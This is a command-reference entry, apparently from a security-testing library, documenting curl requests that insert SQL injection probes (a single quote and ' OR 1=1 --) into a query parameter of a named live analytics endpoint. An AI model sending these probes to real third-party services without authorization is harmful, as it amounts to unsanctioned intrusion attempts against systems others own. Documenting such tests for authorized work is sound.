---
id: cmd-433792-curl-fuzz
data: >-
  curl
  'https://stats2.agilecrm.com/addstats?callback=jQuery&guid=abc&sid=123&url=https://rocket.chat/&agile=def&domain=rocket.chat&new=\'
  '
tags:
  - fuzzing
  - sqli
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:07.762Z'
verified: false
validated: true
submitted: true
---
# curl-fuzz-new-param

## Command

```bash
curl 'https://stats2.agilecrm.com/addstats?callback=jQuery&guid=abc&sid=123&url=https://rocket.chat/&agile=def&domain=rocket.chat&new=\' '
```

## Description

Sends a request with a fuzzing payload (single quote) in the 'new' parameter to test for SQL injection responses.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL params | Endpoint with injected payload | Yes |

## Examples

### Basic Usage

```bash
curl 'https://stats2.agilecrm.com/addstats?...&new=\' '
```

### Advanced Usage

```bash
curl 'https://stats2.agilecrm.com/addstats?...&new=\' OR 1=1 --' 
```

## Expected Output

JSON or callback response; anomalies like changed structure indicate potential vuln.

## Related

- [[Related Procedure]]
